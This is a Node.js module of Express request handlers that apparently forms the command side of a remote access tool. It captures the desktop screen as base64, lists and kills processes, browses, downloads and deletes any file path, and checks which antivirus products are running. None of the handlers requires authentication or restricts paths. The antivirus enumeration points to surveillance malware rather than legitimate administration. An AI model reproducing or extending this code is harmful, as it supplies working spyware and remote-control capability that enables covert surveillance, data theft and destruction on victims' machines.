const screenshot = require('screenshot-desktop');
const psList = require('ps-list');
const fs = require('fs');
const path = require('path');

exports.captureScreenshot = async (req, res) => {
  try {
    const img = await screenshot({ format: 'png' });
    res.json({ status: 'success', data: img.toString('base64') });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.listProcesses = async (req, res) => {
  try {
    const list = await psList();
    res.json({ status: 'success', data: list });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.killProcess = async (req, res) => {
  try {
    const pid = parseInt(req.params.pid);
    process.kill(pid);
    res.json({ status: 'success' });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.listFiles = (req, res) => {
  const dir = req.query.path || '.';
  try {
    const files = fs.readdirSync(dir).map(name => {
      const stat = fs.statSync(path.join(dir, name));
      return { name, isDir: stat.isDirectory(), size: stat.size };
    });
    res.json({ status: 'success', files });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.downloadFile = (req, res) => {
  const filePath = req.query.path;
  if (!filePath) return res.status(400).json({ status: 'error', message: 'path required' });
  res.download(filePath);
};

exports.deleteFile = (req, res) => {
  const filePath = req.query.path;
  try {
    fs.unlinkSync(filePath);
    res.json({ status: 'success' });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

const avProcesses = ['avast', 'avg', 'defender', 'kaspersky', 'mcafee', 'clam', 'sophos', 'bitdefender', 'eset'];
exports.detectSecuritySoftware = async (req, res) => {
  try {
    const list = await psList();
    const active = list.filter(p => avProcesses.some(n => p.name.toLowerCase().includes(n)));
    res.json({ status: 'success', software: active.map(p => p.name) });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};
